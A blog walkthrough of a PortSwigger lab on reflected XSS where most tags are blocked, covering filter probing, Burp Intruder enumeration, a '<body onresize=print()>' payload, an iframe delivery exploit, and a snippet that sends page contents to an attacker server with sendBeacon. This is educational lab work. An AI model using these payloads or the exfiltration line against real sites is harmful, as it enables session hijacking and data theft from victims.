---
layout: post
title: "Nothing encoded, every tag blocked"
date: 2026-10-03
categories: [web-security, walkthrough]
tags: [bscp, burp-suite, burp-intruder, burp-scanner, xss, reflected, waf-bypass, portswigger]
excerpt: "My probe came back completely naked — angle brackets, quotes, everything raw, the textbook 'nothing encoded' case. So I sent <script> and got back 400 'Tag is not allowed'. The character filter and the tag filter are two different walls, and the probe can only see one of them."
lang: en
page_id: reflected-xss-tags-blocked-mystery-lab
permalink: /posts/reflected-xss-tags-blocked-mystery-lab/
---

I'd sent the gentlest probe I know — `zzz'"<>` — into the search box, and it came back in the response completely naked: `'` raw, `"` raw, `<` raw, `>` raw, not a single `&lt;` anywhere. This is the textbook grade-zero case. Nothing encoded. The kind of reflection where the payload is a copy-paste from the manual and you're done before your coffee's cold.

So I typed the obvious thing, `<script>print()</script>`, hit send, and the server answered:

```
HTTP/2 400 Bad Request
"Tag is not allowed"
```

A reflection that passes every dangerous character raw, attached to a server that refuses the most basic tag in the language. Both true, in the same input box, in the same breath.

That gap — open to the characters, closed to the tag — is the post.

## Setup: second XSS session, still filtering the Mystery Lab

The [last session]({% post_url 2026-10-01-dom-cookie-manipulation-mystery-lab %}) was my first XSS inside the Mystery Lab Challenge — the one that turned out to be server-side reflected XSS wearing a "DOM" label. This is the second, same move: open the Mystery Lab, filter it down to **XSS**, and let it hand me something without telling me the difficulty.

I walked the app with the proxy on, doing nothing clever — just building the map of *where does my input come back*. The search box was the obvious candidate. A quick targeted scan on the `GET /?search=...` request, and Burp flagged it immediately:

> **Cross-site scripting (reflected)** — the value of the `search` parameter is copied into the response.

The request Burp used to prove it looked like this:

```
GET /?search=ciao%3cLeHIF%3e
```

Before chasing the payload, I wanted to understand what that request *was*. Because it's not a payload — it's a question, and reading the question is the whole skill.

## 1. What the probe is actually asking

Decode the parameter and Burp sent `ciao<LeHIF>`. Two parts, two jobs.

`LeHIF` is a **random marker**. It does nothing offensive. Its only job is to be a string that could never appear in the page by accident, so you can `Ctrl+F` the response and land exactly where the server wrote your input. (I use `zzz` by hand for the same reason — I already know what I searched for.)

The `<` and `>` wrapped around it are the real question, and it's sharper than "does my text come back?" A search box almost always echoes the term. The question is:

> **do the structural characters survive, or does the app neutralise them?**

That's the entire line between harmless and XSS. There are exactly four characters that carry *structural* meaning in HTML — the ones that can lift you out of plain text and into code:

| Char | Structural role | Why you test it |
|---|---|---|
| `<` | opens a tag | if it survives, you can create your own tags |
| `>` | closes a tag | you need it to complete/open a tag |
| `"` | delimits a double-quoted attribute value | lets you break *out* of an attribute |
| `'` | delimits a single-quoted attribute value | same, for single quotes |

So I sent all four at once — `zzz'"<>` — in a single request. You don't yet know *which context* you'll land in, and different contexts need different keys, so you test the whole keyring in one shot and read the answer off the response. Here's what came back:

```html
<h1>0 search results for 'zzz'"<>'</h1>
```

Read it with the table in hand:

1. **`zzz` placed me** → I'm inside an `<h1>`, in **free HTML text**.
2. **`<` and `>` are raw** (not `&lt;`/`&gt;`) → I can open a tag. Door wide open.
3. **`'` and `"` are raw too** → I could break out of an attribute… except I'm not *in* an attribute. Those surrounding `'...'` are just template decoration, text like everything else. Nothing to escape.

That last point matters: in free HTML text there's **no break-out to perform**. Unlike the [cookie lab]({% post_url 2026-10-01-dom-cookie-manipulation-mystery-lab %}), where I had to close a quote *and* close a tag *and* open my own, here I just open a tag and the parser takes it seriously. The probe said: *free text, brackets pass, go.*

So I went.

## 2. The 400 that rewrote the lab

`<script>print()</script>` → `400 "Tag is not allowed"`.

I'll be honest about the half-second of confusion, because it's the point of the whole session. The probe had just told me, in plain bytes, that `<` and `>` come back untouched. And they *do*. So why does a string made of exactly those characters get rejected?

The answer is that **the probe and the server are checking two different things, on two different layers.**

- My probe `zzz'"<>` ends in `<>` — a `<` immediately followed by a `>`, nothing between them. `<>` is **not a valid tag name**. To a filter that scans for tags, it's noise. It sails through.
- `<script>` is `<` followed by **a tag name the server recognises**. And *that* is what gets blocked.

So this isn't a **character-level** filter (it's not encoding `<` into `&lt;` — we proved it doesn't). It's a **tag-level** filter: it parses my input, sees I'm trying to open a tag, looks at *which* tag, and if it's on the blacklist, 400. The characters are free. The *tokens* are policed. And the probe, by design, only measures characters — it literally cannot see a tag filter, because `<>` doesn't look like a tag.

This is the same lesson as last time — every layer lies about the next — but on a layer I hadn't thought to distrust. A probe that passes the characters does **not** guarantee the tags pass. Character and token are two separate walls, and I'd only tested the first.

That reframes the entire lab. It's not "nothing encoded" (the easy case). It's **most tags and attributes blocked**: they let you inject HTML, then take away the obvious bricks. The job is no longer "write the payload." It's **"find out what they forgot to block."**

## 3. Stop guessing, start enumerating

Here's the mindset shift. While I thought it was open, throwing *a* payload made sense. The moment there's a blacklist, throwing payloads blind is the worst possible move: if `<img onerror=...>` fails, I don't know whether `img` is blocked, or `onerror`, or my syntax. I have to **split the questions** and answer them one at a time. That's what Burp Intruder is for.

**Phase A — which tag survives?** Marker on the tag *name only*, brackets fixed, payload list = every HTML tag from PortSwigger's XSS cheat sheet:

```
GET /?search=<§§>
```

Sort by status code and the blacklist tells on itself. Every `<script>...` variant — and there were a lot of clever ones in the list — came back `400`:

```
<script>onerror=alert;throw 1</script>                → 400
<script>{onerror=alert}throw 1</script>               → 400
<script>throw onerror=eval,'=alert\x281\x29'</script> → 400
```

`script` is blacklisted. Every creative reshuffling of it dies the same way. Stop looking at them — same closed door.

The `200`s are the gold:

```
<body onresize="print()">                → 200
<body onpagereveal=alert(1)>             → 200
<body onpageswap=navigator.sendBeacon(…)> → 200
```

**Phase B falls out of the same run.** The survivors aren't just a tag — they're a tag *and* an event that got through. `<body>` is allowed. And on `<body>`, the events `onresize`, `onpagereveal`, `onpageswap` are allowed. The filter isn't "no tags" — it's "not the *usual* tags and events." `script`, `img`/`onerror`, the famous ones, are gone. A few escaped the net. Finding the forgotten pair is the entire game, and Intruder plus the cheat sheet is how you find it under exam pressure without guessing.

(Worth noticing *why* those three survived: `onpagereveal` and `onpageswap` are brand-new events. Blacklists are hand-written, and hand-written lists don't know about events that shipped last year. That's not a detail — it's the whole business model of the cheat sheet, which I'll come back to.)

## 4. The payload that's accepted and does nothing

`<body onresize=print()>` came back `200`. Context is free HTML text, so no break-out — the payload is just that, clean:

```
<body onresize=print()>
```

And here's the trap the `200` hides. Put `/?search=<body onresize=print()>` straight in the browser and **nothing happens**. No `print()`. The payload is accepted, sits in the DOM, and looks stone dead.

It isn't dead. An event handler doesn't fire by itself — **something has to trigger it.** `onresize` waits for the window to resize, and loading a page normally never resizes anything. That's not a bug in my payload; it's the definition of the event.

Which is exactly why `onresize` is the *intended* survivor: it can be triggered **from the outside**. Put the vulnerable page in an `<iframe>`, then change the iframe's size → the window inside resizes → `onresize` fires → `print()`. The injection was never the hard part. The delivery is the lab.

## 5. The delivery (and the suspicious part: it worked first try)

The victim is a bot that opens my exploit-server link once, in its own browser. So the exploit is an iframe that loads the poisoned search and then resizes itself:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E"
        onload="this.style.width='100px'">
</iframe>
```

- **`src`** loads the search with the payload. The page renders, `<body onresize=print()>` lands in the DOM, and `print()` does **not** fire yet — no resize has happened.
- **`onload`** fires once the iframe finishes loading → I change its `width` → the iframe resizes → the window inside fires **`onresize`** → **`print()`**.

(The brackets in `src` are URL-encoded `%3C`/`%3E` because they live inside an HTML attribute of the iframe — keep the attribute's own parsing clean.)

Paste it into the exploit server body, **Store**, **View exploit** to test on myself, **Deliver to victim**. Solved — first try, no misfire.

I'm flagging that because the honest emotion here isn't triumph, it's mild suspicion. After the cookie lab, where the delivery was the part that fought me, having the iframe work on the first attempt felt *too* smooth — like I'd skipped a step. I hadn't. The reason it was smooth is that I'd already paid the understanding cost in step 4: I knew *before* writing the iframe that `onresize` wouldn't self-fire, so I built the trigger in from the start instead of discovering I needed it. The delivery was easy because the diagnosis was done. That's the actual lesson about delivery — it's easy in proportion to how well you understood the payload's firing condition first.

## The pattern underneath

The surprise of this lab compresses into one sentence: **a probe that passes the characters tells you nothing about the tokens.** My `zzz'"<>` proved `<` and `>` survive, and it was right — and completely useless for predicting that `<script>` would 400. Character-level encoding and token-level blacklisting are two independent walls. I tested the first and assumed the second didn't exist. The `400` was the second wall introducing itself.

And the thing that generalises past this one lab: **the value isn't knowing `<script>alert(1)</script>`.** Everything blocks that. The value is knowing what's *left* when the obvious is gone — the unusual tag (`<body>`, `<math>`, SVG), the event the blacklist author never heard of (`onpagereveal` shipped too recently to be on anyone's list). That's why the cheat sheet exists and keeps getting updated: it's a live scoreboard in the race between the people writing blacklists and the people finding the tag they forgot. Today I watched that race happen in three `200`s.

As for what the bug *buys* you — the reason any of this matters beyond a lab:

```javascript
// The payload isn't the point. This is what runs once a tag fires:
fetch('/admin/delete?user=carlos', {credentials:'include'});   // act as the victim
navigator.sendBeacon('//my-server/', document.body.innerHTML); // exfiltrate what they see
```

An XSS runs *your* JavaScript in the app's own origin, as the victim. You inherit everything the app can do in their browser: read the DOM, read non-`HttpOnly` cookies, and — the modern core — make authenticated requests *as them*, cookies attached automatically, CSRF tokens read straight from the page. `print()` only proves the engine turns over. In the exam it's the bridge to the admin (deliver XSS → their browser runs a privileged `fetch` → you escalate). In the field it's reflected-XSS-plus-a-pretext: a link to the right person, usually an admin, and their session becomes your proxy into things you can't reach directly.

## What comes next

The open thread is the other kind of event. `onresize` needs an *external* trigger, which is why the delivery needed an iframe doing the resizing. But some of the survivors don't — `onpagereveal` and `onpageswap` fire on navigation itself, no resize required. Would the delivery collapse to a single plain link with one of those? And more broadly: this blacklist was beaten by *newness*. The next filter won't be. The question that opens is what you do when the blacklist is current — when there's no forgotten event, and the way through is encoding tricks, context confusion, or a sink that parses your input twice. That's where "find the tag they forgot" stops working and something harder begins. Next few labs.

## Takeaways

- **A probe that passes the characters says nothing about the tokens.** `zzz'"<>` proved `<`/`>` survive and was useless against a tag-level blacklist — `<>` doesn't look like a tag, so the filter never saw it. Character and token are two separate walls.
- **"Reflected XSS" is not one difficulty.** Same label as last session; last time it was a copy-paste, this time a blacklist. The hardness lives in *how much is encoded* and *what context you land in*, never in the name.
- **When there's a blacklist, enumerate — don't guess.** Intruder on the tag name, then on the event, with the cheat-sheet lists. A blind payload that fails can't tell you *which* part failed; a sorted Intruder run tells you exactly.
- **A `200` payload can still be inert.** `<body onresize=print()>` is accepted and does nothing until something resizes the window. An event handler is only as dangerous as its trigger.
- **The delivery is easy in proportion to how well you understood the firing condition.** It worked first try because I knew `onresize` needed an external trigger *before* writing the iframe — not after.

## Useful references

- [PortSwigger — Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
- [PortSwigger — Cross-site scripting cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [PortSwigger — Using Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)

---

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
